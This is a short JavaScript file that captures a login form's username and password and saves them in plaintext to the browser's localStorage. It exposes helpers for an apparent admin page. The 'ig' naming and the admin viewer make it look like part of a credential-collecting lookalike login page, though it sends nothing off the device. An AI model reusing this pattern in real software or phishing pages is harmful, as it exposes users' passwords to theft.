(function () {
    const STORAGE_KEY = "ig_login_entries_v1";

    function readEntries() {
        try {
            const raw = localStorage.getItem(STORAGE_KEY);
            if (!raw) return [];
            const data = JSON.parse(raw);
            return Array.isArray(data) ? data : [];
        } catch (e) {
            console.error("Failed to parse entries", e);
            return [];
        }
    }

    function writeEntries(entries) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
    }

    function onSubmit(event) {
        event.preventDefault();
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value;

        const entry = {
            id: Date.now(),
            username,
            password,
            createdAt: new Date().toISOString()
        };

        const entries = readEntries();
        entries.unshift(entry);
        writeEntries(entries);

        // Optionally clear the password field
        document.getElementById("password").value = "";

        // Simple UX feedback
        const button = document.querySelector(".btn-primary");
        const originalText = button.textContent;
        button.textContent = "Saved";
        button.disabled = true;
        setTimeout(() => {
            button.textContent = originalText;
            button.disabled = false;
        }, 1000);
    }

    const form = document.getElementById("login-form");
    if (form) {
        form.addEventListener("submit", onSubmit);
    }

    // Expose helpers for admin page
    window.__IG_STORE__ = { readEntries, writeEntries, STORAGE_KEY };
})();


